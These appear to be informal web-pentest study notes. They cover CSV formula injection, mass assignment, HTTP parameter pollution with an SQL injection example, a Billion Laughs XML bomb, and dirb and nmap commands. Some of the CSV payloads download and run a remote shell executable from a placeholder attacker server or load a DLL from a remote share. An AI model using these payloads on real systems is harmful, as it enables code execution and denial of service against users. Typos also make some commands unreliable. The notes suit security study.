Formula injection:
====
when web application is processing user supplied data in EXPORT functionality spread sheet.

>>> OR
                          
CSV Injection occurs when the data injection occurs when the data in a spreadsheet cell is not properly validated prior to export. 
The attacker usually injects a malicious payload (formula) into the input field.
Once the data is exported, the spreadsheet executes the malicious payload on the assumption of a standard macro.

<h3>Payload:</h3>
           
           DDE ("cmd";"/C calc";"!A0")A0
           @SUM(1+9)*cmd|' /C calc'!A0
           =10+20+cmd|' /C calc'!A0
           =cmd|' /C notepad'!'A1'
           =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
           =cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1

<h3>Mass Assignment</h3>
    
 When there are 2 parameters and the user insert the third un-recognised parameter and aceepted without validating is described as Mass assignment.h3
 
 <h3>HTTP Parameter Pollution</h3>
  
  HTTP Parameter Pollution (HPP) is a Web attack evasion technique that allows an attacker to craft a HTTP request in order to manipulate or retrieve hidden information. 
   For example:
   
   Regular attack: 
   
             http://webApplication/showproducts.asp?prodID=9 UNION SELECT 1,2,3 FROM Users WHERE id=3 —

Attack using HPP: 

        http://webApplication/showproducts.asp?prodID=9 /*&prodID=*/UNION /*&prodID=*/SELECT 1 &prodID=2 &prodID=3 FROM /*&prodID=*/Users /*&prodID=*/ WHERE id=3 —- -
    
 <h3>XML Billion Laugh Attack</h3>
 
 The Billion Laughs attack is a denial-of-service attack that targets XML parsers. The Billion Laughs attack is also known as an XML bomb, or more esoterically, the exponential entity expansion attack. A Billion Laughs attack can occur even when using well-formed XML and can also pass XML schema validation.

The vanilla Billion Laughs attack is illustrated in the XML file represented below.

            <?xml version="1.0"?>
            <!DOCTYPE lolz [
            <!ENTITY lol "lol">
            <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
            <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
            <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
            <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
            <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
            <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
            <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
            <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
            ]>
            <lolz>&lol9;</lolz>

Dirb
===

DIRB is a command line based tool to brute force any directory based on wordlists. 
DIRB will make an HTTP request and see the HTTP response code of each request


To perform directory search

     ./dirb http://www.test.org/ word_list.txt
    
To perform file name search with specific extension. Below mentioned example will check for files name with extensions .html and .asp

     ./dirb https://www.test.org/ common.txt -X .html,.asp
     
N-MAP
===

 To find out firewall IS active or not
 
            nmap -sA 192.168.0.1 
 
  Fast scan

          nmap -F 192.168.0.1  

   For udp ports scan

            nmap -sU 192.168.0.1 

  For specific port

            nmap -F 192.168.0.1 -p 47,49

   When firewall blocking the ping request

              nmap -F 192.168.0.1-pn

   To find host version & service

            nmap -sV 192.168.0.1




     
